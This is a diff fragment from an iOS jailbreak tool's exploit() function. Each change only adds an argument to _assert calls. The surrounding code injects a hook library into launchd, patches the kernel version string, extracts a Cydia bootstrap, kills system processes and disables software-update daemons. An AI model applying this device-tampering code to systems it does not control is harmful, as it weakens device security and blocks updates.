         rv = [md writeToFile:@"/jb/jailbreakd.plist" atomically:YES];
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 1);
+        _assert(rv == 1, nil);
         if (!access("/var/log/jailbreakd-stderr.log", F_OK)) {
             rv = unlink("/var/log/jailbreakd-stderr.log");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         if (!access("/var/log/jailbreakd-stdout.log", F_OK)) {
             rv = unlink("/var/log/jailbreakd-stdout.log");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         if (!access("/var/tmp/jailbreakd.pid", F_OK)) {
             rv = unlink("/var/tmp/jailbreakd.pid");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         rv = execCommandAndWait("/bin/launchctl", "load", "/jb/jailbreakd.plist", NULL, NULL, NULL);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = access("/var/tmp/jailbreakd.pid", F_OK);
         LOG("rv: " "%d" "\n", rv);
         for (i = 0; !(i >= 20 || rv == 0); i++) {
@@ -1825,7 +1825,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             rv = access("/var/tmp/jailbreakd.pid", F_OK);
             LOG("rv: " "%d" "\n", rv);
         }
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         LOG("Successfully spawned jailbreakd.");
     }
     
@@ -1835,32 +1835,32 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         if (!access("/usr/lib/pspawn_hook.dylib", F_OK)) {
             rv = unlink("/usr/lib/pspawn_hook.dylib");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         rv = symlink("/jb/pspawn_hook.dylib", "/usr/lib/pspawn_hook.dylib");
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         if (load_tweaks) {
             LOG("Patching launchd...");
             PROGRESS("Exploiting... (39/48)", 0, 0);
             if (!access("/var/log/pspawn_hook_launchd.log", F_OK)) {
                 rv = unlink("/var/log/pspawn_hook_launchd.log");
                 LOG("rv: " "%d" "\n", rv);
-                _assert(rv == 0);
+                _assert(rv == 0, nil);
             }
             if (!access("/var/log/pspawn_hook_xpcproxy.log", F_OK)) {
                 rv = unlink("/var/log/pspawn_hook_xpcproxy.log");
                 LOG("rv: " "%d" "\n", rv);
-                _assert(rv == 0);
+                _assert(rv == 0, nil);
             }
             if (!access("/var/log/pspawn_hook_other.log", F_OK)) {
                 rv = unlink("/var/log/pspawn_hook_other.log");
                 LOG("rv: " "%d" "\n", rv);
-                _assert(rv == 0);
+                _assert(rv == 0, nil);
             }
             rv = inject_library(1, "/usr/lib/pspawn_hook.dylib");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         LOG("Successfully patched launchd.");
     }
@@ -1872,16 +1872,16 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         PROGRESS("Exploiting... (40/48)", 0, 0);
         rv = uname(&u);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         for (i = 0; !(i >= 5 || strstr(u.version, DEFAULT_VERSION_STRING)); i++) {
             rv = updateVersionString(DEFAULT_VERSION_STRING, tfp0, kernel_base);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             rv = uname(&u);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
-        _assert(strstr(u.version, DEFAULT_VERSION_STRING));
+        _assert(strstr(u.version, DEFAULT_VERSION_STRING), nil);
         LOG("Successfully updated version string.");
     }
     
@@ -1893,59 +1893,59 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         if (access("/.installed_unc0ver", F_OK)) {
             rv = chdir("/");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             rv = execCommandAndWait("/jb/tar", "--use-compress-program=/jb/lzma", "-xvpkf", "/var/tmp/strap.tar.lzma", NULL, NULL);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 512 || rv == 0);
+            _assert(rv == 512 || rv == 0, nil);
             rv = _system("/usr/libexec/cydia/firmware.sh");
             LOG("rv: " "%d" "\n", rv);
             rv = WEXITSTATUS(rv);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             rv = _system("/usr/bin/dpkg --configure -a");
             LOG("rv: " "%d" "\n", rv);
             rv = WEXITSTATUS(rv);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 256 || rv == 0);
+            _assert(rv == 256 || rv == 0, nil);
             a = fopen("/.installed_unc0ver", "w");
             LOG("a: " "%p" "\n", a);
-            _assert(a != NULL);
+            _assert(a != NULL, nil);
             rv = fclose(a);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             rv = chmod("/.installed_unc0ver", 0644);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             rv = chown("/.installed_unc0ver", 0, 0);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             run_uicache = 1;
         }
         rv = unlink("/jb/tar");
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = unlink("/jb/lzma");
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = unlink("/var/tmp/strap.tar.lzma");
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         if (!access("/usr/bin/debugserver", F_OK)) {
             rv = unlink("/usr/bin/debugserver");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         rv = symlink("/jb/debugserver", "/usr/bin/debugserver");
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         if (!access("/usr/bin/spawn", F_OK)) {
             rv = unlink("/usr/bin/spawn");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         rv = symlink("/jb/spawn", "/usr/bin/spawn");
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         LOG("Successfully extracted bootstrap.");
     }
     
@@ -1957,16 +1957,16 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             PROGRESS("Exploiting... (42/48)", 0, 0);
             a = fopen("/.cydia_no_stash", "w");
             LOG("a: " "%p" "\n", a);
-            _assert(a != NULL);
+            _assert(a != NULL, nil);
             rv = fclose(a);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             rv = chmod("/.cydia_no_stash", 0644);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             rv = chown("/.cydia_no_stash", 0, 0);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             LOG("Successfully disabled stashing.");
         }
     }
@@ -1987,22 +1987,22 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         LOG("Allowing SpringBoard to show non-default system apps...");
         PROGRESS("Exploiting... (44/48)", 0, 0);
         md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
-        _assert(md != nil);
+        _assert(md != nil, nil);
         for (int i = 0; !(i >= 5 || [md[@"SBShowNonDefaultSystemApps"] isEqual:@(YES)]); i++) {
             rv = kill(findPidOfProcess("cfprefsd"), SIGSTOP);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             md[@"SBShowNonDefaultSystemApps"] = @(YES);
             rv = [md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 1);
+            _assert(rv == 1, nil);
             rv = kill(findPidOfProcess("cfprefsd"), SIGKILL);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
-            _assert(md != nil);
+            _assert(md != nil, nil);
         }
-        _assert([md[@"SBShowNonDefaultSystemApps"] isEqual:@(YES)]);
+        _assert([md[@"SBShowNonDefaultSystemApps"] isEqual:@(YES)], nil);
         LOG("Successfully allowed SpringBoard to show non-default system apps.");
     }
     
@@ -2015,45 +2015,45 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             if (!access("/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist", F_OK)) {
                 rv = execCommandAndWait("/bin/launchctl", "unload", "/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist", NULL, NULL, NULL);
                 LOG("rv: " "%d" "\n", rv);
-                _assert(rv == 0);
+                _assert(rv == 0, nil);
                 rv = rename("/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist", "/System/Library/com.apple.mobile.softwareupdated.plist");
                 LOG("rv: " "%d" "\n", rv);
-                _assert(rv == 0);
+                _assert(rv == 0, nil);
             }
             if (!access("/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist", F_OK)) {
                 rv = execCommandAndWait("/bin/launchctl", "unload", "/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist", NULL, NULL, NULL);
                 LOG("rv: " "%d" "\n", rv);
-                _assert(rv == 0);
+                _assert(rv == 0, nil);
                 rv = rename("/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist", "/System/Library/com.apple.softwareupdateservicesd.plist");
                 LOG("rv: " "%d" "\n", rv);
-                _assert(rv == 0);
+                _assert(rv == 0, nil);
             }
             if (!access("/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/Support/softwareupdated", F_OK)) {
                 rv = rename("/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/Support/softwareupdated", "/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/softwareupdated");
                 LOG("rv: " "%d" "\n", rv);
-                _assert(rv == 0);
+                _assert(rv == 0, nil);
             }
             if (!access("/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/Support/softwareupdateservicesd", F_OK)) {
                 rv = rename("/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/Support/softwareupdateservicesd", "/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/softwareupdateservicesd");
                 LOG("rv: " "%d" "\n", rv);
-                _assert(rv == 0);
+                _assert(rv == 0, nil);
             }
             if (findPidOfProcess("softwareupdated")) {
                 rv = kill(findPidOfProcess("softwareupdated"), SIGKILL);
                 LOG("rv: " "%d" "\n", rv);
-                _assert(rv == 0);
+                _assert(rv == 0, nil);
             }
             if (findPidOfProcess("softwareupdateservicesd")) {
                 rv = kill(findPidOfProcess("softwareupdateservicesd"), SIGKILL);
                 LOG("rv: " "%d" "\n", rv);
-                _assert(rv == 0);
+                _assert(rv == 0, nil);
             }
             rv = execCommandAndWait("/bin/rm", "-rf", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdateDocumentation/*", NULL, NULL, NULL);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             rv = execCommandAndWait("/bin/rm", "-rf", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate/*", NULL, NULL, NULL);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             LOG("Successfully disabled Auto Updates.");
         }
     }
@@ -2078,7 +2078,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             PROGRESS("Exploiting... (47/48)", 0, 0);
             rv = execCommandAndWait("/usr/bin/uicache", NULL, NULL, NULL, NULL, NULL);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             LOG("Successfully ran uicache.");
         }
     }
@@ -2091,7 +2091,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             PROGRESS("Exploiting... (48/48)", 0, 0);
             rv = execCommandAndWait("/usr/bin/ldrestart", NULL, NULL, NULL, NULL, NULL);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             LOG("Successfully loaded Tweaks.");
         }
     }
